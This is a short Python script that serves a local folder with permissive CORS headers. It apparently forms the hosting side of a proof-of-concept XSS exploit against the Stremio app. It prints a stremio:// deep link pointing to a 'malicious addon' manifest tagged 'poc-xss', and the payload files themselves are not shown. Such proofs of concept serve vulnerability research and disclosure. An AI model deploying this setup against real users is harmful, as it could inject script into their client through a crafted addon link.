# python serve.py [port]
# If no port supplied, default to 8000

import http.server, os, re, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
EXTRA = re.compile(r"^(/catalog/[^/]+/[^/]+)/.*\.json$")

class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=ROOT, **kw)

    def translate_path(self, path):
        m = EXTRA.match(path.split("?", 1)[0])
        if m:
            path = m.group(1) + ".json"
        return super().translate_path(path)

    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Cache-Control", "no-store")
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(204)
        self.end_headers()


BASE = "http://127.0.0.1:%d" % PORT
print(f"serving {ROOT} on {BASE}")
print("Opening this url makes it so you dont have to have the malicious addon installed:")
print("stremio:/discover/http%%3A%%2F%%2F127.0.0.1%%3A%d%%2Fmanifest.json/movie/poc-xss" % PORT)
http.server.ThreadingHTTPServer(("127.0.0.1", PORT), H).serve_forever()
